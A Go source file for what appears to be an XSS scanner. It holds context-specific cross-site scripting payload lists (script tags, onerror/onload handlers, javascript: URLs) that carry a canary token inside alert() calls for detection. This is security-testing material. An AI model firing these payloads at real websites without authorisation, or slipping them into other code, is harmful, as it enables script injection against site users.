// Package payloads contains the built-in context-tuned XSS payload sets.
package payloads

import (
	_ "embed"
	"strings"
)

//go:embed params.txt
var paramsFile []byte

// marker replaced with the alert argument at injection time.
const marker = "{TOKEN}"

// KnownParams returns the built-in hidden-parameter wordlist.
func KnownParams() []string {
	var out []string
	for _, line := range strings.Split(string(paramsFile), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "#") {
			out = append(out, line)
		}
	}
	return out
}

// Render substitutes the canary token into a payload. The token is wrapped in
// single quotes so the resulting JavaScript becomes alert('<token>') and the
// intercepted dialog message contains the token verbatim.
func Render(payload string, token string) string {
	return strings.ReplaceAll(payload, marker, "'"+token+"'")
}

var htmlCtx = []string{
	`"><script>alert({TOKEN})</script>`,
	`"><img src=x onerror=alert({TOKEN})>`,
	`"><svg onload=alert({TOKEN})>`,
	`"><svg/onload=alert({TOKEN})>`,
	`"></script><script>alert({TOKEN})</script>`,
	`"><body onload=alert({TOKEN})>`,
	`"><iframe srcdoc="&lt;script&gt;alert({TOKEN})&lt;/script&gt;"></iframe>`,
	`"><a href="javascript:alert({TOKEN})">xsh</a>`,
	`"><video><source onerror="javascript:alert({TOKEN})">`,
}

var attrCtx = []string{
	`" onfocus=alert({TOKEN}) autofocus="`,
	`" onerror=alert({TOKEN}) src="`,
	`' onfocus=alert({TOKEN}) autofocus='`,
	`" onmouseover=alert({TOKEN})="`,
	`'><svg onload=alert({TOKEN})>`,
	`"><svg onload=alert({TOKEN})>`,
	`" onfocusin=alert({TOKEN}) autofocus="`,
	`"><img src=x onerror="alert({TOKEN})">`,
}

var jsCtx = []string{
	`;alert({TOKEN})//`,
	`';alert({TOKEN})//`,
	`";alert({TOKEN})//`,
	`</script><script>alert({TOKEN})</script>`,
}

var urlCtx = []string{
	`javascript:alert({TOKEN})//`,
	`javascript:/*--></title></textarea></style></script><img src=x onerror=alert({TOKEN})>//`,
}

// ByContext returns the payload set for an injection context.
func ByContext(ctx string) []string {
	switch ctx {
	case "attribute":
		return attrCtx
	case "javascript":
		return jsCtx
	case "url":
		return urlCtx
	default: // html + unknown
		return htmlCtx
	}
}
